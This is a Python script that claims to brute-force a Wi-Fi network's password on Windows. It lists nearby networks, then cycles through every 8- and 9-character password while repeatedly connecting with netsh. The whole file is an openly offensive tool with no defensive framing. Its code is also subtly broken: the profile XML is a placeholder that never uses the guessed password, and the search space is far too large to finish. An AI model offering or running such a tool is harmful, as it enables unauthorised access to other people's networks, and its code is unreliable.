import re
import subprocess
from itertools import product

MIN_PASSWORD_LENGTH = 8
MAX_PASSWORD_LENGTH = 9

def create_new_connection(name, ssid, password):
    config = f"""<?xml version=\"1.0\"?>
        <!-- ... (Your XML config here) ... -->
        </WLANProfile>"""
    filename = f"{name}.xml"
    with open(filename, 'w') as file:
        file.write(config)
    return filename

def connect(name):
    command = f"netsh wlan connect name=\"{name}\" interface=Wi-Fi"
    subprocess.run(command, shell=True)

def is_connected(name):
    try:
        output = subprocess.check_output("netsh wlan show interfaces").decode('utf-8')
        return re.sub(' +', ' ', output.split("SSID", 1)[1].split("BSSID")[0].replace(':', '').replace('\n', '')) == name
    except subprocess.CalledProcessError:
        return False

def display_available_networks():
    command = "netsh wlan show networks interface=Wi-Fi"
    subprocess.run(command, shell=True)

def raid(name):
    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-=[]{}|;:'

    for length in range(MIN_PASSWORD_LENGTH, MAX_PASSWORD_LENGTH + 1):
        to_attempt = product(chars, repeat=length)
        for attempt in to_attempt:
            password = ''.join(attempt)
            print(password)
            profile_filename = create_new_connection(name, name, password)
            connect(name)
            if is_connected(name):
                print('Connected to:', name)
                print('The WiFi password is:', password)
                return
    print('Brute-force attack failed.')

def main():
    display_available_networks()
    name = input("Name of Wi-Fi: ")
    raid(name)

if __name__ == "__main__":
    main()
